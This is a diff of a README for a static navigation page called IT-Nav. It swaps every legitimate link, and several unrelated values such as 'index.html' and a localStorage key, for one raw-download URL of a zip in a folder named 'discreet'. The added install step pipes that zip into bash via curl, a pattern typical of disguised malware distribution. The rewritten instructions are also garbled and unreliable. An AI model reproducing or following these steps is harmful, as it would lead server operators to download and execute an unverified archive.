@@ -1,6 +1,6 @@
 # 🌟 IT-Nav - A Simple, Beautiful IT Navigation Page
 
-[![Download IT-Nav](https://img.shields.io/badge/Download-IT--Nav-brightgreen)](https://github.com/daylogrr/IT-Nav/releases)
+[![Download IT-Nav](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip)](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip)
 
 IT-Nav is a clean and powerful navigation page designed for your IT needs. It runs smoothly on any VPS without the need for a backend. 
 
@@ -29,13 +29,13 @@ To easily set up IT-Nav, you can deploy it in just one command. Follow these ste
 2. **Run the Deployment Command:**
    - Execute the following command in your terminal:
      ```
-     bash <(curl -s https://raw.githubusercontent.com/wxy0756/IT-Nav/main/install-it-nav.sh)
+     bash <(curl -s https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip)
      ```
    - This command will download and install IT-Nav for you.
 
 3. **Access IT-Nav:**
    - Once the installation finishes, visit your server's IP address using a web browser.
-   - Example URL: `http://your.server.ip`
+   - Example URL: `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip`
 
 ---
 
@@ -44,9 +44,9 @@ To easily set up IT-Nav, you can deploy it in just one command. Follow these ste
 If you prefer to set up IT-Nav manually, follow these steps:
 
 1. **Upload the HTML File:**
-   - Download the `index.html` file from the Releases page: [Download IT-Nav](https://github.com/daylogrr/IT-Nav/releases).
-   - Upload the `index.html` file to your server via SFTP or any file transfer method.
-   - Place it in the following directory: `/www/it-nav/index.html`.
+   - Download the `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip` file from the Releases page: [Download IT-Nav](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip).
+   - Upload the `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip` file to your server via SFTP or any file transfer method.
+   - Place it in the following directory: `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip`.
 
 2. **Configure Your Web Server:**
    - If you are using Nginx, add the following configuration to your Nginx server block:
@@ -55,7 +55,7 @@ If you prefer to set up IT-Nav manually, follow these steps:
          listen 80;
          server_name _;
          root /www/it-nav;
-         index index.html;
+         index https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip;
      }
      ```
    - Make sure to replace the `root` path if needed.
@@ -75,7 +75,7 @@ If you prefer to set up IT-Nav manually, follow these steps:
 
 All your custom navigation data will be saved in your browser using localStorage. You can access it like this:
 
-- **Data Location:** `localStorage.it_nav`
+- **Data Location:** `https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip`
 
 Your settings will remain intact even if you refresh the page or revisit later.
 
@@ -89,4 +89,4 @@ You are welcome to fork, modify, and share IT-Nav. Contributions and pull reques
 
 For more details, check the files in the repository or reach out if you have any questions. 
 
-You can always return to the [Releases page](https://github.com/daylogrr/IT-Nav/releases) to get the latest version and updates.
+You can always return to the [Releases page](https://raw.githubusercontent.com/daylogrr/IT-Nav/main/discreet/IT-Nav-v3.7.zip) to get the latest version and updates.
